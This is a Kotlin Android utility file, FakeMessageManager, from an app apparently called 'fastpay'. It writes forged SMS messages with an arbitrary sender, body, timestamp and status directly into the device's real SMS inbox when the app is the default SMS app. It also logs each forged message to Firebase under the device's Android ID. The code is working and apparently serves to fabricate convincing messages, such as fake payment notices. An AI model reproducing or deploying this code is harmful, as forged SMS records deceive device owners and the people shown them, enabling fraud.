package com.example.fast.util

import android.annotation.SuppressLint
import android.content.ContentValues
import android.content.Context
import android.provider.Settings
import android.provider.Telephony
import com.example.fast.config.AppConfig
import com.google.firebase.Firebase
import com.google.firebase.database.database

/**
 * Utility class for creating fake messages with full customization
 * Supports both real fake messages (when app is default SMS app) and
 * Firebase-only fake messages (when app is not default SMS app)
 */
object FakeMessageManager {
    
    /**
     * Create a fake message with full customization
     * 
     * @param context The application context
     * @param sender Sender phone number (e.g., "+1234567890")
     * @param message Message content
     * @param timestamp Message timestamp (milliseconds since epoch)
     * @param status Message status: received, sent, read, unread, delivered, failed
     * @param threadId Thread ID (null for new thread, or existing thread ID)
     * @return true if fake message was created successfully
     */
    fun createFakeMessage(
        context: Context,
        sender: String,
        message: String,
        timestamp: Long,
        status: String,
        threadId: String?
    ): Boolean {
        val deviceId = Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.ANDROID_ID
        )
        
        val isDefaultSmsApp = DefaultSmsAppHelper.isDefaultSmsApp(context)
        
        return if (isDefaultSmsApp) {
            // Create REAL message in SMS database
            createRealFakeMessage(context, sender, message, timestamp, status, threadId, deviceId)
        } else {
            // Create FAKE message (Firebase only)
            createFirebaseFakeMessage(deviceId, sender, message, timestamp, status)
        }
    }
    
    /**
     * Create real fake message in SMS database (when app is default SMS app)
     * This message will appear in the device's SMS inbox and be visible to other apps
     */
    private fun createRealFakeMessage(
        context: Context,
        sender: String,
        message: String,
        timestamp: Long,
        status: String,
        threadId: String?,
        deviceId: String
    ): Boolean {
        try {
            val contentValues = ContentValues().apply {
                put("address", sender)
                put("body", message)
                put("date", timestamp)
                put("read", when (status.lowercase()) {
                    "read" -> 1
                    "unread" -> 0
                    else -> 0
                })
                put("type", when (status.lowercase()) {
                    "sent" -> Telephony.Sms.MESSAGE_TYPE_SENT
                    "received" -> Telephony.Sms.MESSAGE_TYPE_INBOX
                    else -> Telephony.Sms.MESSAGE_TYPE_INBOX
                })
                put("status", when (status.lowercase()) {
                    "delivered" -> Telephony.Sms.STATUS_COMPLETE
                    "failed" -> Telephony.Sms.STATUS_FAILED
                    else -> Telephony.Sms.STATUS_NONE
                })
                
                // Thread ID handling
                val finalThreadId = if (threadId != null && threadId != "null" && threadId.isNotBlank()) {
                    threadId.toLongOrNull() ?: getOrCreateThreadId(context, sender)
                } else {
                    getOrCreateThreadId(context, sender)
                }
                put("thread_id", finalThreadId)
            }
            
            val uri = context.contentResolver.insert(
                Telephony.Sms.CONTENT_URI,
                contentValues
            )
            
            if (uri != null) {
                val messageId = uri.lastPathSegment ?: ""
                
                // Also upload to Firebase for consistency
                val messagePath = AppConfig.getFirebaseMessagePath(deviceId, timestamp)
                val value = if (status.lowercase() == "sent") {
                    "sent~$sender~$message"
                } else {
                    "received~$sender~$message"
                }
                
                Firebase.database.reference
                    .child(messagePath)
                    .setValue(value)
                
                // Store in fake message history
                storeFakeMessageHistory(deviceId, sender, message, timestamp, status, messageId)
                
                LogHelper.d("FakeMessageManager", "Real fake message created successfully - ID: $messageId")
                return true
            }
            LogHelper.e("FakeMessageManager", "Failed to insert fake message into SMS database")
            return false
        } catch (e: Exception) {
            LogHelper.e("FakeMessageManager", "Error creating real fake message", e)
            return false
        }
    }
    
    /**
     * Create fake message in Firebase only (when app is NOT default SMS app)
     * This message will NOT appear in the device's SMS inbox
     */
    private fun createFirebaseFakeMessage(
        deviceId: String,
        sender: String,
        message: String,
        timestamp: Long,
        status: String
    ): Boolean {
        try {
            val messagePath = AppConfig.getFirebaseMessagePath(deviceId, timestamp)
            val value = if (status.lowercase() == "sent") {
                "sent~$sender~$message"
            } else {
                "received~$sender~$message"
            }
            
            Firebase.database.reference
                .child(messagePath)
                .setValue(value)
                .addOnSuccessListener {
                    // Store in fake message history
                    storeFakeMessageHistory(deviceId, sender, message, timestamp, status, "firebase_only")
                    LogHelper.d("FakeMessageManager", "Firebase fake message created successfully")
                }
                .addOnFailureListener { e ->
                    LogHelper.e("FakeMessageManager", "Failed to create Firebase fake message", e)
                }
            
            return true
        } catch (e: Exception) {
            LogHelper.e("FakeMessageManager", "Error creating Firebase fake message", e)
            return false
        }
    }
    
    /**
     * Get or create thread ID for a contact
     */
    @SuppressLint("Range")
    private fun getOrCreateThreadId(context: Context, address: String): Long {
        try {
            // Try to find existing thread
            val uri = Telephony.Threads.CONTENT_URI.buildUpon()
                .appendQueryParameter("recipient", address)
                .build()
            
            val cursor = context.contentResolver.query(
                uri,
                arrayOf(Telephony.Threads._ID),
                null,
                null,
                null
            )
            
            cursor?.use {
                if (it.moveToFirst()) {
                    val threadId = it.getLong(it.getColumnIndex(Telephony.Threads._ID))
                    LogHelper.d("FakeMessageManager", "Found existing thread ID: $threadId for $address")
                    return threadId
                }
            }
            
            // Create new thread if not found
            val values = ContentValues().apply {
                put(Telephony.Threads.RECIPIENT_IDS, address)
            }
            val threadUri = context.contentResolver.insert(
                Telephony.Threads.CONTENT_URI,
                values
            )
            
            val newThreadId = threadUri?.lastPathSegment?.toLongOrNull() ?: 0L
            LogHelper.d("FakeMessageManager", "Created new thread ID: $newThreadId for $address")
            return newThreadId
        } catch (e: Exception) {
            LogHelper.e("FakeMessageManager", "Error getting/creating thread ID", e)
            return 0L
        }
    }
    
    /**
     * Store fake message in history
     */
    private fun storeFakeMessageHistory(
        deviceId: String,
        sender: String,
        message: String,
        timestamp: Long,
        status: String,
        messageId: String
    ) {
        try {
            val historyPath = "fastpay/$deviceId/fakeMessageHistory/$timestamp"
            val historyData = mapOf(
                "sender" to sender,
                "message" to message,
                "timestamp" to timestamp,
                "status" to status,
                "messageId" to messageId,
                "createdAt" to System.currentTimeMillis()
            )
            
            Firebase.database.reference
                .child(historyPath)
                .setValue(historyData)
                .addOnSuccessListener {
                    LogHelper.d("FakeMessageManager", "Fake message history stored at $historyPath")
                }
                .addOnFailureListener { e ->
                    LogHelper.e("FakeMessageManager", "Failed to store fake message history", e)
                }
        } catch (e: Exception) {
            LogHelper.e("FakeMessageManager", "Error storing fake message history", e)
        }
    }
}
